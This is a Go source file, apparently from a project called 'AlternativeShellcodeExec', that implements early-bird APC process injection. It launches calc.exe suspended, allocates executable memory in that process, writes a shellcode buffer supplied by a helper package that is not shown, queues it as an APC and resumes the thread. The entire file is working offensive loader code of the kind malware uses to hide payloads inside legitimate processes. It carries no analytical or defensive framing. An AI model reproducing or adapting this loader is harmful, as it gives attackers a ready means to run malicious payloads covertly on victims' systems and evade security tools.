package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

func Run(op []byte) {

	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	//CreateProcessA := kernel32.MustFindProc("CreateProcessA")
	VirtualAllocEx := kernel32.MustFindProc("VirtualAllocEx")
	WriteProcessMemory := kernel32.MustFindProc("WriteProcessMemory")
	QueueUserAPC := kernel32.MustFindProc("QueueUserAPC")
	ResumeThread := kernel32.MustFindProc("ResumeThread")

	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	const CREATE_SUSPENDED = 0x00000004

	err := syscall.CreateProcess(nil, syscall.StringToUTF16Ptr("C:\\Windows\\System32\\calc.exe"), nil, nil, true, CREATE_SUSPENDED, nil, nil, &si, &pi)
	if err != nil {
		fmt.Println("Error creating process:", err)
		return
	}

	shellSize := len(op)
	const MEM_COMMIT = 0x1000
	const PAGE_EXECUTE_READWRITE = 0x40

	r1, _, err := VirtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(shellSize), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if r1 == 0 {
		fmt.Println("Error allocating memory:", err)
		return
	}

	shellAddress := r1

	r2, _, err := WriteProcessMemory.Call(uintptr(pi.Process), shellAddress, uintptr(unsafe.Pointer(&op[0])), uintptr(shellSize), 0)
	if r2 == 0 {
		fmt.Println("Error writing memory:", err)
		return
	}

	r3, _, err := QueueUserAPC.Call(shellAddress, uintptr(pi.Thread), 0)
	if r3 == 0 {
		fmt.Println("Error queuing APC:", err)
		return
	}

	r4, _, err := ResumeThread.Call(uintptr(pi.Thread))
	if r4 == 0xffffffff {
		fmt.Println("Error resuming thread:", err)
		return
	}
}

func main() {
	Run(util.ShellCode())
}
